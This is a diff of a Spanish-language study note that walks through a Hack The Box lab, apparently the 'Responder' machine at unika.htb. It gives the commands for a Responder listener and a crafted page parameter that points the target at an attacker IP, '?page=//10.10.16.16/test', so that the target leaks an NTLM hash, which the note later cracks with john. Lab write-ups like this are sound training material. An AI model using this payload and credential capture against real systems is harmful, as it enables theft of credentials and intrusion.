@@ -17,17 +17,24 @@ La utilidad **Responder** en Linux es una herramienta usada en **pentesting de r
     - Montar ataques tipo _Man-in-the-Middle_
 
 -------
-## Ponerse en escucha
+# Explotacion
 
+Donde dice el idioma arriba al aderecha que aparece el boton *EN* vamos a cambiar de idioma a por ejemplo *FR*
+![[Responder10.png]]
+Vemos que con otro idioma nos redirecciona a un link: http://unika.htb/index.php?page=french.html
+![[Responder9.png]]
+
+#### Escucha con [[Herramientas-Comandos/NTLM/Responder|Responder]]
 ```shell
-responder -I InterfazDeRed
-Ejemplo: responder -I tun0
+responder -I tun0
 ```
-![[Responder1.png]]
+*Parametro:*
+	`-I` Interfaz de red que la podemos chequear con el parametro [[ifconfig]]
 
 Estando en escucha con el responder entramos a este link `http://unika.htb/?page=//10.10.16.16/test` para que envie una peition y interceptarla (El archivo test no existe)
-El resultado se va a almacenar en el archivo ubicado en el directorio `/usr/share/responder/logs`
+![[Responder11.png]]
 
-![[Responder3.png]]
-Y en este caso nos responde con un hash que posteriormente vamos a crackear con [[john]]
-![[Responder2.png]]
+El [[Herramientas-Comandos/NTLM/Responder|Responder]] va a interceptar esta informacion
+![[Responder12.png]]
+
+El resultado se va a almacenar en el archivo ubicado en el directorio `/usr/share/responder/logs`
